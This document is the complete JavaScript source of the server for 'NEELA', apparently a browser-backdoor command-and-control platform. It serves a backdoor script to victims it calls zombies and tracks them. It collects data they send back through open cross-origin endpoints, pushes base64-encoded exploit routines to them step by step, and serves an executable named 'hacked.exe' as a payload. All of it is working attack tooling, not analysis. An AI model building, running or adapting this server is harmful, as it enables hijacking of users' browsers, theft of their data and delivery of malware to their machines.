var app = require('express')(),
    server = require('http').createServer(app),
    ent = require('ent'),
    session = require('express-session'),
    bodyParser = require('body-parser'),
    cookieParser = require('cookie-parser'),
    fs = require('fs'),
    ip = require("ip"),
    func = require('./function/function.js'),
    path = require('path'),
    io = require('socket.io').listen(server);
    var zombie_list = [];
    var routine_wait = [];
    var routine_list = [];
    var disconnect = [];
    var zombie = "";
    var start_loader = 0;
    var action = [];
    var action = {
      "action":[
        // {'name':'Lunch exec', 'number':1,'done':0,'routine':'replace_exe.neela'}
      ]
    };
    //var routine_test = {'action':[{'number':1,'done':0,'routine':'facebook'}]};

var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}


var colors = require('colors/safe');
console.log('['+colors.green('+')+'] Start '+colors.underline('NEELA')+' Platform');
var config = fs.readFileSync('./config/config.ini').toString();
var username = config.split('username=')[1].split('password=')[0].trim();
var password = config.split('password=')[1].trim();
var login_in = 0;
app.use(session({
  secret: 'secret',
  resave:true,
  saveUninitialized:true
}));
app.set('trust proxy', 1)
app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
  extended: true
}));

console.log('|___['+colors.blue('+')+'] http://127.0.0.1:3000 => Neela platform');
console.log('|___['+colors.blue('+')+'] http://127.0.0.1:3000/backdoor.js => Neela backdoor');
console.log('['+colors.green('~')+'] Loading LAN...');
console.log('|___['+colors.blue('+')+'] http://'+ip.address()+':3000 => Neela platform');
console.log('|___['+colors.blue('+')+'] http://'+ip.address()+':3000/backdoor.js => Neela backdoor');
app.get('/',function(req, res) {
    if(req.session.username){
      res.sendFile(__dirname + '/data/html/platform.html');
    }
    else{
      res.sendFile(__dirname + '/data/html/index.html');
    }
});

function getDirectories(path) {
  return fs.readdirSync(path).filter(function (file) {
    return fs.statSync(path+'/'+file).isDirectory();
  });
}

function getRoutineList(){
  routine_list = [];
  fs.readdir(__dirname+'/exploit/routine/', function(err, files) {
    if (err) return;
    files.forEach(function(f) {
      var routine_name = f;
      var f = __dirname+'/exploit/routine/'+f;
      if(fs.lstatSync(f).isDirectory()){
        routine_list.push(routine_name);
      }
    });
    return routine_list;
  });
}

app.get('/testdir', function(req, res){
    fs.readdir(__dirname+'/exploit/routine/', function(err, files) {
    if (err) return;
    files.forEach(function(f) {
      var routine_name = f;
      var f = __dirname+'/exploit/routine/'+f;
      if(fs.lstatSync(f).isDirectory()){
        console.log('Files: ' + routine_name);
        res.end('ok');
      }
    });
  });
})

app.get('/logo.png', function(req, res){
  res.sendFile(__dirname + '/data/images/logo.png');
});

app.get('/gate/:base', function(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  // console.log('gate');
  io.emit('new_gate', req.params.base);
  console.log('|__['+colors.green('+')+'] Received routine data');
  res.end('ok');
});

app.get('/images/bg.png', function(req, res){
  res.sendFile(__dirname + '/data/images/bg.png');
})


function getDateTime() {
    var date = new Date();
    var hour = date.getHours();
    hour = (hour < 10 ? "0" : "") + hour;
    var min  = date.getMinutes();
    min = (min < 10 ? "0" : "") + min;
    var sec  = date.getSeconds();
    sec = (sec < 10 ? "0" : "") + sec;
    var year = date.getFullYear();
    var month = date.getMonth() + 1;
    month = (month < 10 ? "0" : "") + month;
    var day  = date.getDate();
    day = (day < 10 ? "0" : "") + day;
    return year + ":" + month + ":" + day + ":" + hour + ":" + min + ":" + sec;

}


app.get('/json', function(req, res){
  fs.readFile(__dirname + '/exploit/routine/facebook/info.neela', function (err, data) {
    if (err) throw err;
    var end = JSON.parse(data);
    res.end(end.step.step1);
  });
})


app.get('/backdoor', function(req, res){
  fs.readFile(__dirname + '/data/backdoor.js', function (err, data) {
    if (err) throw err;
    res.end(data);
  });
});

// ZOMBIE

app.get('/login_zombie', function(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  console.log('|_['+colors.green('+')+'] New zombie');
  req.session.username = func.makeid();
  io.emit('listing',{zombie:req.session.username});
  res.end(req.session.username);
});

app.post('/information_backdoor', function(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  if(req.body.zombie){
    var type_gate = req.body.gate_name;
    zombie = req.body.zombie;
    io.emit('new_log', {'zombie':req.body.zombie,'name':type_gate,'information':req.body.information});
  }
  res.end('ok');
});

app.get('/next/:step/:name_routine', function(req, res){
    var nb_step = req.params.step;
    var data_action = action.action;
    for(var element in data_action)
    {
        var routine_name = data_action[element].routine;
        if(routine_name == req.params.name_routine){
          fs.readFile(__dirname + '/exploit/routine/'+routine_name+'/info.neela', 'utf8', function (err,data) {
          if (err) {
            return console.log(err);
          };
          var routine_information = JSON.parse(data);
          var steping = routine_information.step;
          var execute_step = 0;
          res.setHeader('Access-Control-Allow-Origin', '*');
          for(var x = 0;x < steping.length;x++){
              if(execute_step == 1){
                var next_step = x;
                fs.readFile(__dirname + '/exploit/routine/'+routine_name+'/'+routine_information.step[next_step].name, function (err, data) {
                  if (err) throw err;
                  var payload = data.toString('base64');
                  res.end(payload);
                  console.log('|__['+colors.blue('+')+'] next step send');
                  io.emit('delete_zombie',{'name':zombie});
                  });
              }
              if(x == nb_step){
                execute_step = 1;
              }
          }
        });
      }
    }
});

app.get('/routine_zombie/:zombie', function(req, res){
  if(start_loader == 1){
  var zombie = req.params.zombie;
  // console.log('Zombie routine : ' + zombie);
  res.setHeader('Access-Control-Allow-Origin', '*');
    if(routine_wait[zombie] == undefined){
      routine_wait[zombie] = 2;
      disconect_z(zombie);
      res.end('');
    }
  else if(routine_wait[zombie] > 20){
    io.emit('delete_zombie',{'name':zombie,'error':1});
    res.end('ok');
  }
  else if(routine_wait[zombie] == 5){
    if(action.action.length > 0){
        var data_action = action.action;
        for(var element in data_action)
        {
          var number = data_action[element].number;
          var executed = data_action[element].done;
          var routine_name = data_action[element].routine;
          fs.readFile(__dirname + '/exploit/routine/'+routine_name+'/info.neela', 'utf8', function (err,data) {
          if (err) {
            return console.log(err);
          };
          var routine_information = JSON.parse(data);
          if(executed != '1' && number != '0'){
            fs.readFile(__dirname + '/exploit/routine/'+routine_name+'/'+routine_information.step[0].name, function (err, data) {
              if (err) throw err;
              res.setHeader('Access-Control-Allow-Origin', '*');
              var payload = data.toString('base64');
              res.end(payload);
              console.log('|__['+colors.blue('+')+'] routine send');
              io.emit('delete_zombie',{'name':zombie});
              });
          }
          });
          if(number == '0' && executed != '1'){
              executed = '1';
          }
        }
        routine_wait[zombie] += 1;
    }
  }
}
});

function disconect_z(zombie){
  setTimeout(function(){
    if(disconnect[zombie] == undefined){
      if(routine_wait[zombie] != undefined){
        if((routine_wait[zombie] < 5) || (routine_wait[zombie] == '1')){
          console.log('|_['+colors.red('~')+'] '+zombie+' Logout.');
          io.emit('delete_zombie',{'name':zombie,'disconnect':1});
          disconnect[zombie] = 1;
        }
      }
    }
  },20000);
}
io.sockets.on('connection', function (socket) {
  socket.on('select_routine', function(routine){
    var value = routine.name;
    action = {'action':[{'number':1,'done':0,'routine':value}]};
    console.log('|_['+colors.green('+')+'] Routine selected : '+value);
    socket.emit('return_routine', {'name':value});
  })
  socket.on('get_routine', function(){
    if(action.action[0] == undefined){
      socket.emit('choose_routine',routine_list);
    }
  });
  socket.on('start_loader',function(value){
    start_loader = value;
    if(start_loader == 1){
      console.log('|____['+colors.green('+')+'] Loader started');
    }
    else{
      console.log('|____['+colors.red('-')+'] Loader stopped');
    }
  });
});

app.post('/zombie_online', function(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  io.emit('online_notif', {'name':req.body.name, 'status':'on'});
  if(start_loader == 1){
    if(routine_wait[req.body.name] == undefined){
      routine_wait[req.body.name] = 2;
      var status = '<i class="fa fa-spinner fa-spin">';
      status = Base64.encode(status);
      io.emit('new_log', {'zombie':req.body.name,'name':'Waiting stability','information':status});
    }
    else if(routine_wait[req.body.name] < 5) {
      routine_wait[zombie] += 1;
    }
  }
  res.end('ok');
});

// ZOMBIE

app.post('/login', function(req, res){
  if(req.body.username == username && req.body.password == password){
    req.session.username = username;
    res.redirect('/platform');
  }
});

app.get('/exploit/routine/sound/sound.wav', function(req, res){
  res.sendFile(__dirname + '/exploit/routine/sound/sound.wav');
});

app.get('/payload', function(req, res){
  res.sendFile(__dirname + '/exploit/exe/hacked.exe');
})

app.get('/platform', function(req, res){
  if(req.session.username){
    getRoutineList();
    res.sendFile(__dirname + '/data/html/platform.html', {'test':'test'});
  }
  else{
    res.sendFile(__dirname + '/data/html/index.html');
  }
});


server.listen(3000);
